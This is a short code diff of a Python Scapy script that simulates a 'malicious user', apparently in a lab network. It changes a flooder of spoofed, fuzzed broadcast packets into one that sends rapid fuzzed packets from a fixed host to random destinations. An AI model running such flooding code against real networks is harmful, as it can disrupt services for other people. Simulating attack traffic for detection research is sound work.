@@ -4,9 +4,9 @@ from scapy.all import *
 def main(argv):
 	n = 1
 	# packet-count = 1
-	h = 'ddos_user.py -n <ip-number>'
+	h = 'malicious_user.py -n <ip-number>'
 	try:
-		opts, args = getopt.getopt(argv,"hn:",["ip-number="])
+		opts, args = getopt.getopt(argv,"hn:c:",["ip-number="])
 	except getopt.GetoptError:
 		print h
 		sys.exit(2)
@@ -17,13 +17,13 @@ def main(argv):
 		elif opt in ("-n", "--ip-number"):
 			n = int(arg)
 
-	broadcast_mac_dst="ff:ff:ff:ff:ff:ff"
-	
-	mac_src = RandMAC()
-	ip_src = RandIP()
+	real_mac_src = "00:00:00:00:00:02"
+	real_ip_src = "10.0.0.2"
+
+	mac_dst = RandMAC()
 	ip_dst = RandIP()
-	p = fuzz(Ether(src=mac_src, dst=broadcast_mac_dst)/IP(src=ip_src, dst=ip_dst))
-	sendp(p, count=n, inter=0.2)
+	p = fuzz(Ether(src=real_mac_src, dst=mac_dst)/IP(src=real_ip_src, dst=ip_dst))
+	sendp(p, count=n)
 
 if __name__ == "__main__":
 	main(sys.argv[1:])
